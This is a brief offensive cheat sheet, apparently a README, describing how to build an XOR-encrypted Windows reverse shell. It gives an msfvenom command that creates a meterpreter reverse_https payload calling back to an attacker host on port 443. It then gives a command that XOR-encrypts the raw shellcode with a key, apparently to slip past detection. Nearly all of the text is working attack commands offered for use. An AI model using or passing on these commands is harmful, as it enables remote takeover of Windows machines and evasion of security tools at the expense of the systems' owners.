# BIN Shellcode XOR Encrypted Reverse Shell

### 1) Craft .bin payload

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ATTACKER_IP] LPORT=443 -f raw -o [PAYLOAD_NAME].bin

### 2) XOR Encrypt payload

    # python .\xorencrypt.py <payload_file> <output_file> <xor_key>
    python3 ./xorencrypt.py ./pay.bin pay_encrypted.bin a70f8922029506d2e37f375fd638cdf9e2c039c8a1e6e01189eeb4efb
